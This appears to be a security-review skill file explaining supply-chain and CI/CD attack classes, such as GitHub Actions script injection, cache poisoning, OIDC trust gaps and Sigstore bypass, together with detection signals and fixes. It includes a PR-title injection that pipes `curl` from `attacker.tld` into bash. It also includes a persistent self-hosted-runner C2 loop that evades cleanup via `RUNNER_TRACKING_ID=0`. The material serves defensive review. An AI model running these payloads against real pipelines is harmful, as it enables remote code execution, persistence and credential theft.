---
name: supply-chain-ci-integrity
description: Supply-chain and CI/CD integrity — dependency confusion, typosquatting, maintainer-account compromise, build-system / postinstall hooks, GitHub Actions script injection, pull_request_target abuse, Actions cache poisoning, self-hosted-runner persistence, OIDC federation claim-validation gaps, SBOM/provenance poisoning, code-signing / sigstore verification bypass, and container-registry tampering
---

# Supply-Chain and CI/CD Integrity

Supply-chain and CI/CD integrity failures are the class where attacker code reaches production without being written in production. The primitive is **control transfer along the build pipeline**: a typosquatted dependency executes `postinstall` on every developer and CI runner; a `pull_request_target` workflow checks out the attacker's branch and runs it with repo secrets; an `${{ github.event.pull_request.title }}` interpolated into an unquoted `run:` step evaluates attacker-controlled shell metacharacters as code; a self-hosted runner survives a job via `RUNNER_TRACKING_ID=0` and becomes a persistent foothold; an OIDC role trust policy with no `sub` or `aud` condition hands AWS credentials to any workflow in any repository; a published artifact's SLSA provenance verifier pins only `subject.name` + `builder.id` and accepts a tampered document whose `workflow.repository` points to the attacker's fork; a Cosign legacy bundle slips the certificate-identity check by presenting a public key instead of an X.509 chain. The question is never "did the code pass review?" — it is "which pipeline step converted attacker control into production code or production credentials?"

This skill owns the **integrity / build-system / CI** surface beyond dependency CVEs. Dependency CVEs themselves — vulnerable library versions reachable from your lockfile — stay with the project's existing dependency-handling pipeline. The class begins at **the moment an attacker's bits can transit a trusted path**: the registry publish step, the maintainer token, the Actions workflow, the signing bundle, the registry manifest, the SBOM.

The 2024–2026 frontier is a band-filling surface and routes to `supply_chain_ci_integrity_novel_deep.md`: XZ Utils (CVE-2024-3094), tj-actions/changed-files (CVE-2025-30066), reviewdog/action-setup (CVE-2025-30154), ultralytics PyPI (Dec 2024, four malicious releases), s1ngularity / Nx (Aug 2025), Shai-Hulud npm worm (Sep 2025 and Nov 2025 waves), Jenkins args4j (CVE-2024-23897), TeamCity (CVE-2024-27198 / CVE-2024-27199), Cosign bundle bypass (CVE-2026-22703), eslint-config-prettier (CVE-2025-54313), PyTorch (CVE-2025-32434). Per-primitive expansions live in `supply_chain_ci_integrity_advanced_deep.md`.

## Attack Surface

**Package Registries**
- npm (public + private), PyPI, RubyGems, Maven Central, NuGet, crates.io, pkg.go.dev
- Internal / enterprise registries (JFrog Artifactory, Sonatype Nexus, Azure Artifacts, Google Artifact Registry, AWS CodeArtifact)
- OS package repositories reached from build images (apt/yum/apk, Alpine community/testing branches)
- Container registries (Docker Hub, GHCR, Quay, ECR, GCR/AR, ACR) and OCI manifest lists
- Rust `cargo` git/path dependencies, Python `pip --index-url`, Go module proxy and GOPROXY-off direct VCS fetches

**Build Systems**
- `postinstall` / `preinstall` / `prepare` npm scripts (any `package.json` with `scripts.*install*`)
- `setup.py` / `pyproject.toml` build backends with arbitrary Python at wheel-build time
- Cargo `build.rs`, Gradle plugin resolution, Maven plugin resolution with downloaded plugins
- Dockerfile `ADD`/`RUN curl | sh` and multi-stage builds pulling from attacker-reachable mirrors
- Lock-file drift (yarn.lock vs package.json; Pipfile.lock vs Pipfile)

**CI/CD Platforms**
- GitHub Actions (workflow files, reusable workflows, composite actions, Marketplace actions)
- GitLab CI, Jenkins (pipeline-as-code, Jenkinsfile, legacy Freestyle), CircleCI, Buildkite, Travis-CI legacy tokens
- Azure DevOps Pipelines, AWS CodeBuild / CodePipeline, Google Cloud Build
- Self-hosted runners (GitHub, GitLab) and their lifecycle (ephemeral vs persistent, labels)

**Identity Federation**
- OIDC trust policies for CI → cloud (`aud=sts.amazonaws.com`, `sub=repo:org/repo:ref:refs/heads/main`)
- `token.actions.githubusercontent.com` as federated issuer; `gitlab.com` likewise; `vstoken.actions.visualstudio.com`
- Repository-level, environment-level, and organization-level secrets; GitHub `GITHUB_TOKEN` scoping
- Service-account impersonation chains (GCP Workload Identity Federation, AWS AssumeRoleWithWebIdentity)

**Signing and Provenance**
- Sigstore (`cosign`, `fulcio`, `rekor`, `gitsign`) — keyless signing with transparency log
- GPG / PGP (release artifacts, Debian / Red Hat package signatures, PyPI historical GPG signatures)
- in-toto attestations, SLSA provenance (v1.0 schema with buildDefinition + runDetails)
- SBOMs (CycloneDX, SPDX) — attached as OCI referrers or shipped alongside releases
- Transparency logs (Rekor, sigstore.dev, Alpine `apk` keys)

**Input Vectors**
- Any dependency the lockfile resolves — direct, transitive, dev-only, test-only
- Any Marketplace action referenced by tag (not SHA)
- Any artifact pulled from `actions/cache` or an external registry during build
- Any file the build reads from the fork's branch (`actions/checkout@v4` with `ref: ${{ github.event.pull_request.head.sha }}`)
- Any token minted by OIDC trust policy; any role whose trust policy matches a wildcard subject
- Any SBOM/attestation consumer that trusts fields without full cryptographic verification

## Core Primitive — Dependency Confusion

**Primitive.** A build tool resolving `@org/private-lib` queries the public registry first (or alongside the private one) and selects the attacker's public package when its version is higher.

**Vulnerable pattern.** An organization uses `@acme/internal-utils` from a private npm registry. An attacker publishes `@acme/internal-utils@99.0.0` to the public npm registry. A developer runs `npm install` without a strict `.npmrc` that pins the scope to the private registry — npm's dependency resolver picks the higher version from public npm.

```jsonc
// .npmrc that pins the scope — the correct defense
@acme:registry=https://npm.internal.acme.corp
//npm.internal.acme.corp/:_authToken=${INTERNAL_TOKEN}
```

**Attack cost.** Zero infrastructure. The attacker publishes once and waits for CI/dev machines to install.

**Scope.**
- **npm** — scoped (`@org/*`) packages are vulnerable without `.npmrc` scope pinning. Unscoped internal names (`internal-utils`) are even more vulnerable — any dev typo of a public lookup resolves to the attacker.
- **PyPI** — vulnerable when `pip install --index-url` is set but `--extra-index-url` falls back to pypi.org, or when the private index is accessed via `pip.conf` with no priority pinning.
- **Maven** — Nexus / Artifactory virtual repositories can be ordered such that Maven Central answers before internal; GAV coordinates with lower internal versions lose.
- **NuGet** — `nuget.config` with multiple `packageSources` plus `packageSourceMapping` is the only reliable defense.
- **RubyGems / Bundler** — `Gemfile` source priority is observed, but typosquatting is the common vector.
- **Go modules** — the module proxy serves whichever name the import path references; dependency confusion for Go is primarily *typosquatting*, since import paths include a domain.

**Confirmation signals.**
1. Package name collision between public registry and internal lockfile.
2. Public-registry package published recently with a very high version number (99.x.x, 999.x.x).
3. `npm install` / `pip install` log line showing the public URL for a name the organization believes is internal.
4. Postinstall / `setup.py install` network traffic to a non-internal destination.

**Primary ownership.** Mechanism owned here; the full per-registry resolution-order table lives in `supply_chain_ci_integrity_advanced_deep.md` with Burp-replayable publish recipes.

## Core Primitive — GitHub Actions ${{ ... }} Script Injection

**Primitive.** GitHub Actions interpolates `${{ ... }}` expressions **as literal text into the step script before the shell parses it**. When the expression's value is attacker-controlled (PR title, PR body, branch name, issue body, commit message, HEAD commit `author.name`) and the step uses `run:` without quoting the value, shell metacharacters in the attacker value evaluate as code with the runner's permissions and secrets.

**Measured** (`.zen-batch-artifacts/batch-16/measure/03-github-actions-script-injection.output.txt`): attacker-controlled branch `bugfix-$(touch /tmp/zen-batch16-rce-proof && echo pwned)` interpolated into `run: echo branch: ${{ github.head_ref }}` produces runner-emitted line `echo branch: bugfix-$(touch /tmp/zen-batch16-rce-proof && echo pwned)`; bash executes the inner `$(...)`, `/tmp/zen-batch16-rce-proof` appears on the host, stdout prints `branch: bugfix-pwned`. The safe variant — bind to `env:` and reference `"$BRANCH"` from the shell — treats the metacharacters as literal text.

**Vulnerable pattern** (classic — this is the ultralytics / spotbugs / asyncapi shape):
```yaml
on: pull_request_target
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Checking PR: ${{ github.event.pull_request.title }}"
```

**Attack trigger.** Open a PR titled `whatever $(curl -s https://attacker.tld/x.sh | bash)`. The runner emits the title into the shell line verbatim; the subshell executes.

**Attacker-controlled context fields** (not exhaustive): `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref` (branch name), `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.event.commits[*].message`, `github.event.commits[*].author.name`, `github.event.commits[*].author.email`, `github.head_ref`.

**Trigger-event elevation table.**
| Trigger | Attacker-authored code runs on? | Secrets available? | `GITHUB_TOKEN` write? |
|---|---|---|---|
| `pull_request` (default branch workflow) | fork branch | NO | read-only |
| `pull_request_target` | base branch workflow (default-branch after Jul 2026 hardening) | YES | configurable (default write) |
| `issue_comment` | base branch workflow | YES | configurable |
| `workflow_run` | base branch workflow | YES | configurable |
| `schedule`, `push`, `workflow_dispatch` | base branch workflow | YES | configurable |

The `pull_request_target` row is why Marketplace actions and projects that *check out the PR branch* while using the `pull_request_target` trigger are catastrophically exposed — the attacker's branch executes with the upstream project's secrets.

**Confirmation signals.**
1. Workflow uses `pull_request_target` AND `actions/checkout` with an explicit `ref:` pointing at the PR branch (`${{ github.event.pull_request.head.sha }}`, `${{ github.event.pull_request.head.ref }}`).
2. `run:` step contains unquoted `${{ github.event.* }}` expression where the field is attacker-authored.
3. `env:` block is NOT used to bind the attacker-authored field.
4. Repository has not pinned Marketplace actions to a commit SHA (`@main`, `@v1` — mutable).
5. Workflow has no `permissions:` block (defaults to write-all before GitHub's secure-defaults rollout).

**False positives.** Expressions interpolated into `if:` conditions and `env:` values are not immediately shell-executed; the attack class is only the `run:` sink. Expressions interpolated into `with:` inputs to an action are only exploitable when that action's handler passes the value into a shell. `pull_request` (not `pull_request_target`) runs with no secrets and read-only `GITHUB_TOKEN`, so a vulnerable `pull_request` workflow leaks less — the attacker only gets code-execution on a sandboxed runner.

**Primary ownership.** Mechanism owned here; per-event elevation details and the full checkout-ref table live in `supply_chain_ci_integrity_advanced_deep.md`.

## Core Primitive — Actions Cache Poisoning

**Primitive.** GitHub Actions cache keys are *tenant-shared* across the workflows of a repository (and across branches, by default). An attacker who gains write access to a cache key that a trusted workflow later reads can plant a malicious compiled binary, lockfile, or build artifact that the trusted workflow installs and executes with its secrets.

**Vulnerable pattern.** Project uses `actions/cache@v4` keyed on `${{ hashFiles('**/package-lock.json') }}` or `${{ runner.os }}-build-${{ github.sha }}`. A PR branch workflow (triggered via `pull_request_target` or an open-contribution `pull_request` that writes cache) populates the cache; the main-branch workflow restores it.

**Attack recipe (sketch).**
1. Attacker opens a PR that triggers a cache-writing workflow.
2. The workflow saves `node_modules/` or a built artifact to a predictable key.
3. On the next main-branch build, `actions/cache` restores that key, importing the attacker's binaries.

**Confirmation signals.**
1. `actions/cache` or `actions/cache/save` present in a workflow triggered by `pull_request_target` or `issue_comment`.
2. Cache key not scoped to the base-branch `ref` or the commit SHA of the main branch.
3. Downstream workflow restores the same key and executes the restored content (`npm install`, `tar -xf cache.tar`, `./build/bin/foo`).
4. `cache-mode: restore-only` NOT configured in the restoring workflow (Github's July 2026 mitigation).

**Primary ownership.** Mechanism owned here; the per-key attack recipe lives in `supply_chain_ci_integrity_advanced_deep.md`, and the ultralytics timeline is in `supply_chain_ci_integrity_novel_deep.md`.

## Core Primitive — Self-Hosted Runner Persistence

**Primitive.** When a GitHub Action completes, the runner terminates orphaned processes started during the job by matching the `RUNNER_TRACKING_ID` environment variable. By setting `RUNNER_TRACKING_ID=0` (or any value other than the job's actual tracking ID) on a spawned process, the attacker bypasses this cleanup and the process persists across jobs. On a *persistent* (non-ephemeral) self-hosted runner, that process is a persistent host-level foothold.

**Vulnerable pattern.** Repository uses a self-hosted runner (`runs-on: self-hosted` or a custom label pointing at a long-lived VM). The runner is not configured as ephemeral (no `--ephemeral` flag at registration; or self-hosted scale sets with recycling disabled). Any workflow that attacker code can reach — directly via a public-fork PR, or indirectly via a compromised dependency — spawns a background process with the tracking-ID bypass.

```bash
# Attacker payload inside a workflow step that gains execution
nohup bash -c 'while true; do curl -s https://attacker.tld/c2 | bash; sleep 60; done' \
  < /dev/null > /dev/null 2>&1 &
# Detach from Actions's bookkeeping
disown
export RUNNER_TRACKING_ID=0  # or edit /proc/<pid>/environ
```

**Confirmation signals.**
1. Workflow with `runs-on: self-hosted` AND `pull_request_target` OR open-contribution `pull_request` without a fork-approval gate.
2. Runner registered without `--ephemeral`; the runner process has been up continuously for days/weeks.
3. Residual processes on the runner host whose `/proc/*/environ` contains `RUNNER_TRACKING_ID=0`.
4. Network callbacks from the runner to non-GitHub addresses between jobs.
5. Repository has not restricted fork-PR workflow runs to approvers (`Actions → "Require approval for first-time contributors"` disabled).

**Primary ownership.** Mechanism owned here; chaining into cloud-credential theft lives in `supply_chain_ci_integrity_advanced_deep.md`.

## Core Primitive — OIDC Federation Claim-Validation Gap

**Primitive.** CI-to-cloud federation (GitHub → AWS, GitLab → AWS, GitHub → GCP) authenticates by presenting a short-lived JWT to the cloud's AssumeRole endpoint. The role's trust policy enforces claim conditions. When the trust policy omits `aud` or `sub` conditions — or uses a wildcard — any workflow in any repository can assume the role.

**Vulnerable AWS trust policy** (the misconfiguration class):
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      }
      // NO sub condition — any github.com workflow can assume this role.
    }
  }]
}
```

**Attack trigger.** Any attacker-controlled repository on github.com creates a workflow that calls `aws-actions/configure-aws-credentials@v4` with the victim's role ARN. GitHub mints the OIDC token, STS validates the `aud` claim (satisfied — `sts.amazonaws.com` is the default audience), and returns valid AWS credentials.

**Correct scope** — the `sub` condition locks to repo + branch + optionally environment:
```json
"token.actions.githubusercontent.com:sub": "repo:acme/svc:ref:refs/heads/main"
```

**Scope.**
- **AWS** — `sub`, `aud`, `repository_owner`, `job_workflow_ref`, `environment`, `actor` all available as claim keys.
- **GCP Workload Identity Federation** — attribute conditions, `attribute.repository`, `attribute.ref`, `attribute.workflow_ref`.
- **Azure** — federated credential matching on `sub` and `iss`; no wildcard.

**Confirmation signals.**
1. IAM role trust policy with `token.actions.githubusercontent.com` principal and no `sub` or `job_workflow_ref` condition.
2. `sub` condition uses `*` wildcard or omits the organization prefix.
3. CloudTrail `AssumeRoleWithWebIdentity` events from unexpected repositories.
4. Trust policy copied from a public blog or Stack Overflow (common source of the omission).

**Primary ownership.** Mechanism owned here; the full per-cloud condition map and the attack recipe live in `supply_chain_ci_integrity_advanced_deep.md`.

## Core Primitive — Build-System / Install-Script Code Execution

**Primitive.** Package ecosystems that execute arbitrary code at install time (`npm` postinstall, Python `setup.py install`, cargo `build.rs`, gem native extensions) make every reachable package a code-execution node on every developer and runner that resolves it.

**Vulnerable pattern.** Any `package.json` with a `scripts.postinstall`, `scripts.preinstall`, or `scripts.install` runs that script on `npm install`. Python wheels with a `build_meta` backend run arbitrary Python during `pip install`. Cargo crates with `build.rs` run arbitrary Rust at build time; crates with native dependencies (`-sys`) run `./configure` / `make` on install.

```jsonc
// package.json shape
{
  "name": "innocent-utility",
  "scripts": { "postinstall": "node ./setup.js" }
}
```

**Attack cost.** Register a free npm/PyPI account; publish once.

**Scope.**
- **npm** — `postinstall`, `preinstall`, `install`, `prepare` (prepare also runs on `npm pack`). Yarn 3+ runs postinstall under PnP.
- **pnpm** — `onlyBuiltDependencies` field in `package.json` (pnpm 10+) allowlists which packages may run install scripts; the default blocks postinstall.
- **PyPI** — `setup.py` (legacy) is the primary vector; PEP 517 build backends (`pyproject.toml` with `[build-system]`) still execute Python at wheel-build time.
- **cargo** — `build.rs` runs at crate build time; `[build-dependencies]` runs during the same step.
- **gem** — native extensions run `extconf.rb` / `make`.
- **Composer** — `scripts.post-install-cmd` and `post-update-cmd`.

**Confirmation signals.**
1. Lockfile pins a package whose `package.json` has `scripts.*install*` set.
2. The install script fetches from a URL (`curl`, `wget`, `node -e "fetch(...)"`), writes to home directory, or reads env vars for exfiltration.
3. Install logs show network traffic from a dependency that has no documented runtime network dependency.
4. The package author has few other packages; is young; previously-dormant maintainer account.

**Primary ownership.** Mechanism owned here. Specific maintainer-token-compromise 2024–2026 incidents (ultralytics, Nx, Shai-Hulud, eslint-config-prettier, reviewdog) are in `supply_chain_ci_integrity_novel_deep.md`.

## Core Primitive — Code-Signing / Sigstore Verification Bypass

**Primitive.** Signature verification succeeds while the signer or the signed scope is wrong. Three sub-classes:

1. **Signature verified but signer identity not verified.** A tool that calls `cosign verify` without `--certificate-identity` and `--certificate-oidc-issuer` accepts any valid Sigstore signature — including one from an attacker whose GitHub Actions workflow produced a signature over the attacker's own fork. The signature math checks out; the *who* does not.

2. **Legacy-bundle fallback bypass.** When reading the `cert` field of a legacy Cosign bundle, if parsing failed as X.509, Cosign loaded it as a raw public key and skipped `--certificate-identity` and `--certificate-oidc-issuer` enforcement. GHSA identifier + patched versions in `supply_chain_ci_integrity_novel_deep.md § Class H`.

3. **Rekor-entry disassociation (CVE-2026-22703 class).** A Cosign bundle can be crafted to successfully verify an artifact even if the embedded Rekor entry does not reference the artifact's digest, signature, or public key — any arbitrary Rekor entry can be stitched into a bundle. Version/fix metadata in `supply_chain_ci_integrity_novel_deep.md § Class H`.

**Vulnerable pattern.**
```bash
# Wrong — signer identity not pinned
cosign verify --key ./key.pub ghcr.io/acme/svc:1.2.3

# Also wrong — keyless but no identity pinning
cosign verify ghcr.io/acme/svc:1.2.3

# Correct — keyless with identity + issuer pinning
cosign verify \
  --certificate-identity "https://github.com/acme/svc/.github/workflows/release.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/acme/svc:1.2.3
```

**Confirmation signals.**
1. `cosign verify` invocation without both `--certificate-identity` and `--certificate-oidc-issuer`.
2. Cosign version pre-dates the CVE-2026-22703 fix (versions in `supply_chain_ci_integrity_novel_deep.md`).
3. Verification scripts that trust `cosign verify` exit code without checking the printed cert claims.
4. Rekor transparency log entries whose `subject` does not match the artifact digest.

**Primary ownership.** Mechanism owned here; the sigstore CVE catalog is in `supply_chain_ci_integrity_novel_deep.md`.

## Core Primitive — SBOM / Provenance Poisoning

**Primitive.** A consumer that trusts fields in an SBOM or SLSA provenance document without validating the full signature chain *and* checking that the fields match a project policy ends up trusting attacker-provided metadata.

**Measured** (`.zen-batch-artifacts/batch-16/measure/04-sbom-and-provenance-shape.output.txt`): a naive verifier that pins `subject[0].name` and `predicate.runDetails.builder.id` accepts a tampered SLSA v1.0 provenance whose `predicate.buildDefinition.externalParameters.workflow.repository` has been swapped to the attacker's fork. A strict verifier that also pins `workflow.repository` + `workflow.path` + `ref` rejects it.

**Vulnerable pattern.** CI/CD system installs provenance consumers (`slsa-verifier`, `cosign verify-attestation`) with policy that pins only the artifact's subject digest and the builder platform ID, not the triggering workflow or source repository. Attacker runs their fork through the *same builder platform* (public GitHub Actions), produces a legitimate SLSA L2+ attestation signed by GitHub's identity, and submits the artifact to a downstream consumer.

**Confirmation signals.**
1. `slsa-verifier` call without `--source-uri` and `--source-branch` arguments.
2. Policy document for `cosign verify-attestation` that regex-matches `subject[0].name` only.
3. SBOM consumer tool that reads `creationInfo.creator` for identity without full signature verification.
4. Attestation produced by `github-hosted@v1` builder but `workflow.repository` differs from the organization's canonical repository list.

**Primary ownership.** Mechanism owned here; the full SLSA v1.0 verifier policy and the per-field pinning table live in `supply_chain_ci_integrity_advanced_deep.md`.

## Core Primitive — Container Registry Tampering

**Primitive.** A pull by tag retrieves whichever image the registry currently serves for that tag. Tags are mutable. An attacker who gains push rights to a registry — stolen credentials, token leak, misconfigured registry ACL — can repoint a tag to a malicious image. Pulls by digest are the correct mitigation; pulls by tag inherit the registry's trust surface.

**Vulnerable pattern.**
```yaml
# Dockerfile pulling by mutable tag
FROM node:20-alpine

# Compose / Kubernetes pulling by tag
image: ghcr.io/acme/svc:latest     # ← mutable; attacker-rewritable
# vs
image: ghcr.io/acme/svc@sha256:ab12...   # ← immutable; digest-pinned
```

**Confirmation signals.**
1. Dockerfile, `docker-compose.yml`, Kubernetes manifests, or Helm charts reference images by tag only.
2. Registry has public push rights for internal namespaces (common ECR / GCR misconfiguration via wildcard IAM).
3. Image repository has no admission controller enforcing digest-pinning (Kyverno `verifyImages` policy absent).
4. CI/CD step `docker pull $IMAGE:latest` with no digest verification.

**Primary ownership.** Mechanism owned here; the deep registry-attack recipes (manifest injection, blob substitution, OCI referrer manipulation) live in `supply_chain_ci_integrity_advanced_deep.md`.

## Verification Discipline

Every supply-chain finding requires evidence that bits an attacker controls would reach a trusted execution context:

- **Dependency-confusion claim**: show the public-registry URL in the resolver log AND the internal-registry URL in the organization's `.npmrc` / `pip.conf` / `nuget.config`. A build that resolves to the internal registry is not vulnerable.
- **Script-injection claim**: identify the exact context field (not just "attacker-controlled") AND verify the field is used in a `run:` step without `env:` binding. Expressions in `if:` / `env:` / `with:` are different attack shapes.
- **pull_request_target claim**: verify both the trigger AND the explicit checkout of the fork's ref. A `pull_request_target` workflow that does not `actions/checkout` the fork is not immediately exploitable (secrets stay inside the base-branch workflow).
- **OIDC-federation claim**: fetch the trust policy and confirm the absence of `sub` or `job_workflow_ref` conditions. A policy with `sub` conditioned on the organization alone (`repo:acme/*`) is still vulnerable to anyone with write access to any `acme/*` repo.
- **Code-signing-bypass claim**: run the verifier against a crafted bundle and show the acceptance; a theoretical bypass without a reproducing bundle is a hypothesis.
- **Cache-poisoning claim**: identify both the cache-writing workflow AND the cache-reading workflow AND show the key collision.
- **Self-hosted-runner-persistence claim**: show that the runner is registered without `--ephemeral` AND that attacker code can reach it.

## Chaining

**Upstream (what grants the primitive).**
- A public-registry account grants the publish — the floor is $0.
- A phished / token-leaked maintainer account grants hijack of an existing namespace (routes to `authentication_jwt.md` for the token-theft class and to `information_disclosure.md` for the leak surface).
- A `pull_request_target` misconfiguration grants attacker-authored code execution.
- A trust-policy omission grants OIDC-federated cloud credentials.

**Downstream (what the primitive grants).**
- Code execution on every dev and runner that installs the dependency → routes to `rce.md`.
- Secrets exfiltration from a privileged runner → routes to `information_disclosure.md`.
- Cloud credential theft via OIDC → routes to `cloud/*` for the per-cloud exploitation.
- Production artifact substitution (malicious binary in a signed container, package, or build output).
- Persistence on a self-hosted runner → long-lived C2 foothold.

**Composite chains (end-to-end).**
1. **Phished maintainer → published malicious version → postinstall on CI → OIDC-assumed AWS role → S3 artifact overwrite.** Each hop routes: maintainer phishing → `authentication_jwt.md`; postinstall exec → this file; OIDC → this file (claim-validation gap); S3 overwrite → `cloud/aws.md`.
2. **PR title with `$(...)` → `pull_request_target` + unquoted `run:` → `GITHUB_TOKEN` write → tag push → repoint release tag.** Each hop routes: injection → this file; repo-write → `cloud/github.md`.
3. **Cache poisoning in a public-contribution workflow → main-branch workflow restores poisoned cache → compiled binary with attacker payload is signed by the project's own Sigstore keyless identity.** The signature is *valid* — the identity is the project's own workflow — but the content is attacker-supplied. Each hop routes: cache poisoning → this file; signing path → this file (identity-pinning is irrelevant when the project itself produces the signature).

## Load this file when…

- A finding touches a package registry, a CI/CD pipeline, a build step, a signing/verification call, or a container registry.
- A vulnerability description mentions "supply chain," "pwn request," "pull_request_target," "cache poisoning," "OIDC," "SLSA," "provenance," "SBOM," "cosign," "sigstore," "typosquatting," or "dependency confusion."
- The question is whether a dependency's build-time code is reachable, or whether a CI step grants more trust than its contributor model deserves.
- Routing a report that spans multiple pipeline steps (maintainer compromise → publish → install → CI → cloud); use the composite-chain decomposition above.

For dependency CVEs themselves — a specific vulnerable version of a specific library reachable from your lockfile — stay with the project's existing dependency-handling pipeline. This skill owns everything else about how bits reach production.

## Summary

Supply-chain and CI/CD integrity failures convert attacker control over any upstream step into attacker code in production or attacker possession of production credentials. The primitives are stable: dependency confusion where resolution-order lets public attackers answer first; GitHub Actions `${{ ... }}` script injection where attacker-controlled context fields reach unquoted shell lines; `pull_request_target` plus fork-ref checkout; Actions cache poisoning across contributor and main branches; self-hosted runner persistence; OIDC federation with missing `sub` or `aud` conditions; build-system install scripts across every reachable dependency; code-signing verification without identity pinning; SBOM / SLSA provenance consumers that trust unverified fields; container-registry tags pulled without digest pinning. The attack surface is "every step a bit transits on its way to production," the preconditions are "which step was writable without strict review," and the confirmation signals are the concrete workflow/trust-policy/verifier-invocation shapes above. The 2024–2026 CVE and incident frontier — XZ Utils, tj-actions, reviewdog, ultralytics, Nx, Shai-Hulud, Jenkins args4j, TeamCity, Cosign bundle bypass — lives in `supply_chain_ci_integrity_novel_deep.md`. Per-primitive attack recipes with register-order tables, OIDC exploitation protocols, cache-poisoning timelines, and runner-persistence chains live in `supply_chain_ci_integrity_advanced_deep.md`.
